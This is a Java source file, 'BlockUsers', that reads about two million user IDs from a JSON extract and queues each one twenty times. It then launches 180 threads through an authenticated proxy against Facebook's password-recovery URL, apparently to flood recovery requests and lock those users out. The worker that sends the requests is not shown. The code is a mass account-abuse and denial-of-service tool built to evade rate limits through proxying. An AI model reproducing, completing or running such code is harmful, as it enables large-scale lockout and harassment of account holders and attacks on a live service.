import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;
import com.mashape.unirest.http.async.Callback;
import com.mashape.unirest.http.exceptions.UnirestException;
import org.apache.http.HttpHost;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.NTCredentials;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import org.apache.commons.codec.binary.Base64;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.Proxy;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.Future;

/**
 * Created by gurkiratsingh on 7/8/16.
 */
public class BlockUsers implements Cred{
    public static final int GUESS = 224525;
    public static final int START_QUEUE = 0;
    public static final int END_QUEUE = 2000000;
    public static final String READ_FILE_NAME = "./Extracts/2mil_ids1.json";
    public static final int NUM_THREADS = 180;

    public static int counter = START_QUEUE;
    public static final String BASE_URL = "https://www.beta.facebook.com/recover/password?";
    private BlockingQueue<String> queue = new ArrayBlockingQueue<String>(END_QUEUE - START_QUEUE);
    private ArrayList<String> usernames;
    private Worker[] workers = new Worker[NUM_THREADS];

    public static void main (String[] args){
        BlockUsers passChecker = new BlockUsers();
        passChecker.readJson();
        passChecker.addToQueue();
        passChecker.setProxy();
        passChecker.spawnThreads();
        passChecker.startThreads();
        try {
            Unirest.shutdown();
        }catch (Exception e){
            e.printStackTrace();
        }

    }

    private void setProxy(){
        BasicCredentialsProvider credsProvider = new BasicCredentialsProvider();
        credsProvider.setCredentials(new AuthScope(PROX_URL, Integer.parseInt(PORT)), new NTCredentials(USER,PASS, PROX_URL, ""));
        Unirest.setCredentialsProvider(credsProvider);
        HttpHost proxy = new HttpHost(PROX_URL, Integer.parseInt(PORT), Proxy.Type.HTTP.name());
        Unirest.setProxy(proxy);
    }
    private void readJson(){
        JSONParser parser = new JSONParser();

        try{
            JSONObject jsonObject = (JSONObject) parser.parse(new FileReader(READ_FILE_NAME));
            usernames = new ArrayList<String>(jsonObject.keySet());
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private void addToQueue(){
        try{
            for (int i = START_QUEUE; i < END_QUEUE; i++){
                String username = usernames.get(i);
                for (int j = 0; j < 20; j++){
                    queue.put(username);
                }

            }
        }catch (Exception e){
            e.printStackTrace();
        }finally {
            usernames = null;
        }

    }
    private void spawnThreads(){
        for (int i = 0; i < workers.length; i++){
            Worker worker = new Worker(queue);
            worker.setDaemon(true);
            worker.setPriority(Thread.MAX_PRIORITY);
            workers[i] = worker;
        }
    }

    private void startThreads(){
        for (int i = 0; i < workers.length; i++){
            workers[i].start();
        }
        for (int i = 0; i < workers.length; i++){
            try{
                workers[i].join();
            }catch (Exception e){
                e.printStackTrace();
            }

        }
    }
}
